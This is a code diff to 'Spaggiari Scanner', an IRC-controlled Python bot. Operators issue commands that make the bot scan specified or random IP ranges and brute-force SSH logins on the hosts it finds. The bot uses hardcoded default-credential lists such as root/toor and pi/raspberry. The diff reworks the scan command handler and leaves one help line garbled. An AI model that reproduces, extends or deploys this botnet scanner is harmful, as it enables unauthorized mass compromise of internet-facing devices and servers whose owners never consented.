@@ -31,16 +31,15 @@ Requirments:
  - Paramiko Library (http://www.paramiko.org/)
  
 Commands:
- - @info    <id/all>            | Information about the server.
- - @kill    <id/all>            | Kill the bot.
- - @scan    <id> <start> <end>  | Example: @scan tnnxu 10.13.56.113 10.29.23.200 (Scans from 10.13.56.113 to 10.29.23.200)
- - @scan    <id> a <range>      | Example: @scan tnnxu 107                       (Scans from 107.0.0.0    to 107.255.255.255)
- - @scan    <id> b <range>      | Example: @scan tnnxu 107.13                    (Scans from 107.13.0.0   to 107.13.255.255
- - @scan    <id> c <range>      | Example: @scan tnnxu 107.13.201                (Scans from 107.13.201.0 to 107.13.201.255)
- - @scan    <id> <a/b/c> random | Example: @scan tnnxu b random                  (Scans from ?.?.0.0      to ?.?.255.255)
- - @status  <id/all>            | Check the scanning status on the bot.
- - @stop    <id/all>            | Stop all current running scans.
- - @version <id/all>            | Information about the scanner.
+ - @info    <id/all>           | Information about the server.
+ - @kill    <id/all>           | Kill the bot.
+ - @scan    <id> <start> <end> | Example: @scan tnnxu 10.13.56.113 10.29.23.200 (Scans from 10.13.56.113 to 10.29.23.200)                     (Scans from 107.0.0.0    to 107.255.255.255)
+ - @scan    <id> b <range>     | Example: @scan tnnxu 107.13                    (Scans from 107.13.0.0   to 107.13.255.255
+ - @scan    <id> c <range>     | Example: @scan tnnxu 107.13.201                (Scans from 107.13.201.0 to 107.13.201.255)
+ - @scan    <id> <b/c> random  | Example: @scan tnnxu b random                  (Scans from ?.?.0.0      to ?.?.255.255)
+ - @status  <id/all>           | Check the scanning status on the bot.
+ - @stop    <id/all>           | Stop all current running scans.
+ - @version <id/all>           | Information about the scanner.
  
 Note: Commands require either 'all' or the bots unique id after it.
 If the bot has a nick of 'spag-tnnxu', the id of that bot is 'tnnxu'.
@@ -91,7 +90,7 @@ combos = {
     'root'      : ('root','toor','admin','changeme','pass','password','1234','12345','123456'),
     'admin'     : ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'),
     'cisco'     : 'cisco',
-    'pi'        : 'raspberry',
+    'pi'        : 'raspberry'
 }
 
 deep_combos = {
@@ -112,7 +111,7 @@ deep_combos = {
     'user'      : ('acme','live'),
     'vagrant'   : 'vagrant',
     'virl'      : 'VIRL',
-    'vyos'      : 'vyos',
+    'vyos'      : 'vyos'
 }
 
 # Important Ranges (DO NOT EDIT)
@@ -455,38 +454,36 @@ class IRC(threading.Thread):
                         self.sendmsg(chan, bold + 'Spaggiari Scanner - Version 1.0b - Developed by acidvegas in Python 2.7 - https://github.com/acidvegas/spaggiari/')    
             elif len(args) >= 3:
                 if cmd == 'scan' and args[1] == self.id:
-                    if self.scanning    : self.error(chan, 'A scan is already running.')
-                    elif len(args) != 4 : self.error(chan, 'Missing or invalid arguments.')
-                    elif args[2] in ('a', 'b', 'c'):
-                        if args[2] == 'a':
-                            if args[3] == 'random' : range_prefix = random_int(0,255)
-                            else                   : range_prefix = args[3]
-                            start = range_prefix + '.0.0.0'
-                            end   = range_prefix + '.255.255.255'
-                        elif args[2] == 'b':
-                            if args[3] == 'random' : range_prefix = '%d.%d' % (random_int(0,255), random_int(0,255))
-                            else                   : range_prefix = args[3]
-                            start = range_prefix + '.0.0'
-                            end   = range_prefix + '.255.255'
-                        elif args[2] == 'c':
-                            if args[3] == 'random' : range_prefix = '%d.%d.%d' % (random_int(0,255), random_int(0,255), random_int(0,255))
-                            else                   : range_prefix = args[3]
-                            start = range_prefix + '.0'
-                            end   = range_prefix + '.255'
-                    else:
-                        start = args[2]
-                        end   = args[3]
-                    if check_ip(start) and check_ip(end):
-                        targets = ip_range(start, end)
-                        if not check_range(targets):
-                            self.sendmsg(chan, '[%s] - Scanning %s IP addresses in range...' % (color('#', blue), '{:,}'.format(len(targets))))
-                            self.scanning = True
-                            scan(targets).start()
-                            self.sendmsg(chan, '[%s] - Scan has completed. %s' % (color('#', blue), color('(Threads still may be running.)', grey)))
+                    if not self.scanning:
+                        if len(args) == 4:
+                            if args[2] == 'b':
+                                if args[3] == 'random' : range_prefix = '%d.%d' % (random_int(0,255), random_int(0,255))
+                                else                   : range_prefix = args[3]
+                                start = range_prefix + '.0.0'
+                                end   = range_prefix + '.255.255'
+                            elif args[2] == 'c':
+                                if args[3] == 'random' : range_prefix = '%d.%d.%d' % (random_int(0,255), random_int(0,255), random_int(0,255))
+                                else                   : range_prefix = args[3]
+                                start = range_prefix + '.0'
+                                end   = range_prefix + '.255'
+                            else:
+                                start = args[2]
+                                end   = args[3]
+                            if check_ip(start) and check_ip(end):
+                                targets = ip_range(start, end)
+                                if not check_range(targets):
+                                    self.sendmsg(chan, '[%s] - Scanning %s IP addresses in range...' % (color('#', blue), '{:,}'.format(len(targets))))
+                                    self.scanning = True
+                                    scan(targets).start()
+                                    self.sendmsg(chan, '[%s] - Scan has completed. %s' % (color('#', blue), color('(Threads still may be running.)', grey)))
+                                else:
+                                    self.error(chan, 'Spooky IP address range.')
+                            else:
+                                self.error(chan, 'Invalid IP address range.')
                         else:
-                            self.error(chan, 'Spooky IP address range.')
+                            self.error(chan, 'Missing or invalid arguments.')
                     else:
-                        self.error(chan, 'Invalid IP address range.')
+                        self.error(chan, 'A scan is already running.')
 
     def handle_events(self, data):
         args = data.split()
